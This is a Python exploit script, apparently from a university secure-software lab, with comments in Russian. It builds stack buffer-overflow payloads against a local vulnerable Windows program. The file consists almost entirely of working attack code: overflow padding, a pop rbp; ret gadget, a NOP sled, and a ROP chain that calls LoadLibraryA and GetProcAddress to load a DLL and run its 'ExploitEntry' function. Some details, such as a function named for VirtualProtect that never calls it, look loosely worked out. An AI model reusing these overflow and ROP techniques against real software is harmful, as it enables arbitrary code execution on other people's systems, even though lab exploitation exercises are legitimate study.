import subprocess
from struct import pack
def generate_payload():
    # Адрес pop rbp; ret (little-endian)
    pop_rbp_ret = 0x00007FF9A40111EB
    pop_rbp_ret_bytes = pack('<Q', pop_rbp_ret)  # Упаковываем в 64-битный little-endian
    
    # Размер буфера до перезаписи RBP и RIP
    buffer_size = 72  # 64 (буфер) + 8 (RBP)
    
    # Адрес в стеке, куда мы будем прыгать после второго ret
    # (пусть это будет адрес, следующий сразу за RIP_2)
    rip_2 = 0x0000000A0C7FF8F0
    
    # Шеллкод (пока просто NOP-ы для теста)
    nop_sled = b'\x90' * 16  # 16 NOP-инструкций
    
    payload = (
        b'A' * buffer_size +       # Заполняем буфер
        pop_rbp_ret_bytes +        # Перезаписываем RIP на pop rbp; ret
        pack('<Q', rip_2 - 8) +    # Новое значение RBP (rip_2 - 8)
        pack('<Q', rip_2) +        # RIP_2 - адрес для второго ret
        nop_sled                   # NOP-инструкции (шеллкод)
    )
    
    return payload

def write_payload_file():
    with open("payload.bin", "wb") as f:
        f.write(generate_payload())

def exploit():
    p = subprocess.Popen(
        ['.\\build\\vuln_program.exe'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    payload = generate_payload()
    print(f"Generated payload length: {len(payload)} bytes")
    print(f"Payload hex: {payload.hex()}")

    print("Starting program...")
    p.stdin.write(payload )
    p.stdin.flush()

    output, _ = p.communicate()
    print("Program output:")
    print(output.decode(errors='ignore'))
    print("Program finished")



from pwn import *
def rop_virtual_protect():
    # Адреса (проверьте в x64dbg!)
    LOAD_LIBRARY  = 0x00007FF9A2380830   # kernel32!LoadLibraryA
    GET_PROC_ADDR = 0x00007FF9A237B200   # kernel32!GetProcAddress
    JMP_RAX       = 0x00007FF9A409CC00   # pop rax; pop rdx; ... ; jmp rax

    # Память (адреса должны быть доступны для записи)
    PATH_ADDR     = 0x000000000019FF00   # Адрес для пути DLL
    FUNC_NAME_ADDR= 0x000000000019FF50   # Адрес для имени функции

    # Данные
    dll_path = b"D:\\code\\4course_2sem\\devSecSoft\\lab_3\\infected_dll\\TestDLL\\x64\\Debug\\TestDLL.dll\x00"
    func_name = b"ExploitEntry\x00"

    rop_chain = (
        # 1. LoadLibraryA(dll_path)
        p64(JMP_RAX) +
        p64(LOAD_LIBRARY) +          # RAX = LoadLibraryA
        p64(0xDEADBEEF) +            # RDX (не используется)
        p64(PATH_ADDR) +             # RCX = путь к DLL
        p64(0)*3 +                   # R8-R10 (нули)
        p64(0xBAADF00D) +            # R11 (мусор)
        
        # 2. GetProcAddress(hModule, "ExploitEntry")
        p64(JMP_RAX) +
        p64(GET_PROC_ADDR) +         # RAX = GetProcAddress
        p64(0xDEADBEEF) +            # RDX (не используется)
        p64(PATH_ADDR) +             # RCX = hModule (возврат LoadLibraryA)
        p64(FUNC_NAME_ADDR) +        # R8  = имя функции
        p64(0)*2 +                   # R9-R10 (нули)
        p64(0xCAFEBABE) +            # R11 (мусор)
        
        # 3. Вызов ExploitEntry()
        p64(JMP_RAX) +               # RAX теперь содержит адрес ExploitEntry
        p64(0)*6                     # Очистка регистров
    )

    payload = (
        b"A"*72 +                    # Переполнение буфера
        rop_chain +
        dll_path.ljust(0x50, b"\x00") +  # Путь к DLL (по адресу PATH_ADDR)
        func_name                   # Имя функции (по адресу FUNC_NAME_ADDR)
    )

    with open("payload.bin", "wb") as f:
        f.write(payload)
    with open("payload.bin", "rb") as f:
        data = f.read().hex()
        # Добавляем пробелы между каждыми двумя символами
        spaced_hex = ' '.join([data[i:i+2] for i in range(0, len(data), 2)])
        print(spaced_hex)

def main():
    #payload = generate_payload()
    #print(payload)
    rop_virtual_protect()

if __name__ == "__main__":
    main()